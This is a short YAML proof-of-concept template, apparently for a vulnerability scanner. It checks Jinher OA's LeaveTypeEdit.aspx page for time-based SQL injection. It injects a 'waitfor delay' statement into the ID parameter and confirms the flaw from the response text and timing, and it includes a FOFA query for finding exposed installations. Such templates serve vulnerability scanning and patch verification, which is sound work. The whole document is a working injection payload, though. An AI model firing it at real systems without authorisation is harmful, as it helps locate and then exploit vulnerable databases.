id: poc-yaml-jinher-jhsoft-leavetypeedit-aspx-sqli
info:
  name: 金和OA LeaveTypeEdit.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /c6/Jhsoft.Web.dossier/LeaveTypeEdit.aspx/?ID=1;waitfor+delay%270:0:{{.t1}}%27--&type=EDIT
  expression: 'status_code == 200 &&

    contains(gbk_decode(body),"类型名称不能为空") &&

    contains(gbk_decode(body),"修改类型") &&

    contains(gbk_decode(body),"类型名称") &&

    duration >= t1 &&

    duration <= t2

    '
transport: http
